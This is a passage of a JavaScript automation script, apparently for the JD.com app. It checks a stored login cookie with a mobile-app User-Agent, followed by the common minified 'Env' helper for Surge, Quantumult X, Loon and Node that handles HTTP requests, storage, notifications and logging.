        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0") : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0")
      }
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            $.nickName = data['base'].nickname;
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
// prettier-ignore
function Env(t, e) {class s { constructor(t) { this.env = t } send(t, e = "GET") { t = "string" == typeof t ? { url: t } : t; let s = this.get; return "POST" === e && (s = this.post), new Promise((e, i) => { s.call(this, t, (t, s, r) => { t ? i(t) : e(s) }) }) } get(t) { return this.send.call(this.env, t) } post(t) { return this.send.call(this.env, t, "POST") } } return new class { constructor(t, e) { this.name = t, this.http = new s(this), this.data = null, this.dataFile = "box.dat", this.logs = [], this.isMute = !1, this.isNeedRewrite = !1, this.logSeparator = "\n", this.startTime = (new Date).getTime(), Object.assign(this, e), this.log("", `🔔${this.name}, 开始!`) } isNode() { return "undefined" != typeof module && !!module.exports } isQuanX() { return "undefined" != typeof $task } isSurge() { return "undefined" != typeof $httpClient && "undefined" == typeof $loon } isLoon() { return "undefined" != typeof $loon } toObj(t, e = null) { try { return JSON.parse(t) } catch { return e } } toStr(t, e = null) { try { return JSON.stringify(t) } catch { return e } } getjson(t, e) { let s = e; const i = this.getdata(t); if (i) try { s = JSON.parse(this.getdata(t)) } catch { } return s } setjson(t, e) { try { return this.setdata(JSON.stringify(t), e) } catch { return !1 } } getScript(t) { return new Promise(e => { this.get({ url: t }, (t, s, i) => e(i)) }) } runScript(t, e) { return new Promise(s => { let i = this.getdata("@chavy_boxjs_userCfgs.httpapi"); i = i ? i.replace(/\n/g, "").trim() : i; let r = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout"); r = r ? 1 * r : 20, r = e && e.timeout ? e.timeout : r; const [o, h] = i.split("@"), n = { url: `http://${h}/v1/scripting/evaluate`, body: { script_text: t, mock_type: "cron", timeout: r }, headers: { "X-Key": o, Accept: "*/*" } }; this.post(n, (t, e, i) => s(i)) }).catch(t => this.logErr(t)) } loaddata() { if (!this.isNode()) return {}; { this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path"); const t = this.path.resolve(this.dataFile), e = this.path.resolve(process.cwd(), this.dataFile), s = this.fs.existsSync(t), i = !s && this.fs.existsSync(e); if (!s && !i) return {}; { const i = s ? t : e; try { return JSON.parse(this.fs.readFileSync(i)) } catch (t) { return {} } } } } writedata() { if (this.isNode()) { this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path"); const t = this.path.resolve(this.dataFile), e = this.path.resolve(process.cwd(), this.dataFile), s = this.fs.existsSync(t), i = !s && this.fs.existsSync(e), r = JSON.stringify(this.data); s ? this.fs.writeFileSync(t, r) : i ? this.fs.writeFileSync(e, r) : this.fs.writeFileSync(t, r) } } lodash_get(t, e, s) { const i = e.replace(/\[(\d+)\]/g, ".$1").split("."); let r = t; for (const t of i) if (r = Object(r)[t], void 0 === r) return s; return r } lodash_set(t, e, s) { return Object(t) !== t ? t : (Array.isArray(e) || (e = e.toString().match(/[^.[\]]+/g) || []), e.slice(0, -1).reduce((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math.abs(e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e.length - 1]] = s, t) } getdata(t) { let e = this.getval(t); if (/^@/.test(t)) { const [, s, i] = /^@(.*?)\.(.*?)$/.exec(t), r = s ? this.getval(s) : ""; if (r) try { const t = JSON.parse(r); e = t ? this.lodash_get(t, i, "") : e } catch (t) { e = "" } } return e } setdata(t, e) { let s = !1; if (/^@/.test(e)) { const [, i, r] = /^@(.*?)\.(.*?)$/.exec(e), o = this.getval(i), h = i ? "null" === o ? null : o || "{}" : "{}"; try { const e = JSON.parse(h); this.lodash_set(e, r, t), s = this.setval(JSON.stringify(e), i) } catch (e) { const o = {}; this.lodash_set(o, r, t), s = this.setval(JSON.stringify(o), i) } } else s = this.setval(t, e); return s } getval(t) { return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? (this.data = this.loaddata(), this.data[t]) : this.data && this.data[t] || null } setval(t, e) { return this.isSurge() || this.isLoon() ? $persistentStore.write(t, e) : this.isQuanX() ? $prefs.setValueForKey(t, e) : this.isNode() ? (this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0) : this.data && this.data[e] || null } initGotEnv(t) { this.got = this.got ? this.got : require("got"), this.cktough = this.cktough ? this.cktough : require("tough-cookie"), this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar, t && (t.headers = t.headers ? t.headers : {}, void 0 === t.headers.Cookie && void 0 === t.cookieJar && (t.cookieJar = this.ckjar)) } get(t, e = (() => { })) { t.headers && (delete t.headers["Content-Type"], delete t.headers["Content-Length"]), this.isSurge() || this.isLoon() ? (this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, { "X-Surge-Skip-Scripting": !1 })), $httpClient.get(t, (t, s, i) => { !t && s && (s.body = i, s.statusCode = s.status), e(t, s, i) })) : this.isQuanX() ? (this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, { hints: !1 })), $task.fetch(t).then(t => { const { statusCode: s, statusCode: i, headers: r, body: o } = t; e(null, { status: s, statusCode: i, headers: r, body: o }, o) }, t => e(t))) : this.isNode() && (this.initGotEnv(t), this.got(t).on("redirect", (t, e) => { try { if (t.headers["set-cookie"]) { const s = t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString(); s && this.ckjar.setCookieSync(s, null), e.cookieJar = this.ckjar } } catch (t) { this.logErr(t) } }).then(t => { const { statusCode: s, statusCode: i, headers: r, body: o } = t; e(null, { status: s, statusCode: i, headers: r, body: o }, o) }, t => { const { message: s, response: i } = t; e(s, i, i && i.body) })) } post(t, e = (() => { })) { if (t.body && t.headers && !t.headers["Content-Type"] && (t.headers["Content-Type"] = "application/x-www-form-urlencoded"), t.headers && delete t.headers["Content-Length"], this.isSurge() || this.isLoon()) this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, { "X-Surge-Skip-Scripting": !1 })), $httpClient.post(t, (t, s, i) => { !t && s && (s.body = i, s.statusCode = s.status), e(t, s, i) }); else if (this.isQuanX()) t.method = "POST", this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, { hints: !1 })), $task.fetch(t).then(t => { const { statusCode: s, statusCode: i, headers: r, body: o } = t; e(null, { status: s, statusCode: i, headers: r, body: o }, o) }, t => e(t)); else if (this.isNode()) { this.initGotEnv(t); const { url: s, ...i } = t; this.got.post(s, i).then(t => { const { statusCode: s, statusCode: i, headers: r, body: o } = t; e(null, { status: s, statusCode: i, headers: r, body: o }, o) }, t => { const { message: s, response: i } = t; e(s, i, i && i.body) }) } } time(t, e = null) { const s = e ? new Date(e) : new Date; let i = { "M+": s.getMonth() + 1, "d+": s.getDate(), "H+": s.getHours(), "m+": s.getMinutes(), "s+": s.getSeconds(), "q+": Math.floor((s.getMonth() + 3) / 3), S: s.getMilliseconds() }; /(y+)/.test(t) && (t = t.replace(RegExp.$1, (s.getFullYear() + "").substr(4 - RegExp.$1.length))); for (let e in i) new RegExp("(" + e + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? i[e] : ("00" + i[e]).substr(("" + i[e]).length))); return t } msg(e = t, s = "", i = "", r) { const o = t => { if (!t) return t; if ("string" == typeof t) return this.isLoon() ? t : this.isQuanX() ? { "open-url": t } : this.isSurge() ? { url: t } : void 0; if ("object" == typeof t) { if (this.isLoon()) { let e = t.openUrl || t.url || t["open-url"], s = t.mediaUrl || t["media-url"]; return { openUrl: e, mediaUrl: s } } if (this.isQuanX()) { let e = t["open-url"] || t.url || t.openUrl, s = t["media-url"] || t.mediaUrl; return { "open-url": e, "media-url": s } } if (this.isSurge()) { let e = t.url || t.openUrl || t["open-url"]; return { url: e } } } }; if (this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, o(r)) : this.isQuanX() && $notify(e, s, i, o(r))), !this.isMuteLog) { let t = ["", "==============📣系统通知📣=============="]; t.push(e), s && t.push(s), i && t.push(i), console.log(t.join("\n")), this.logs = this.logs.concat(t) } } log(...t) { t.length > 0 && (this.logs = [...this.logs, ...t]), console.log(t.join(this.logSeparator)) } logErr(t, e) { const s = !this.isSurge() && !this.isQuanX() && !this.isLoon(); s ? this.log("", `❗️${this.name}, 错误!`, t.stack) : this.log("", `❗️${this.name}, 错误!`, t) } wait(t) { return new Promise(e => setTimeout(e, t)) } done(t = {}) { const e = (new Date).getTime(), s = (e - this.startTime) / 1e3; this.log("", `🔔${this.name}, 结束! 🕛 ${s} 秒`), this.log(), (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(t) } }(t, e) }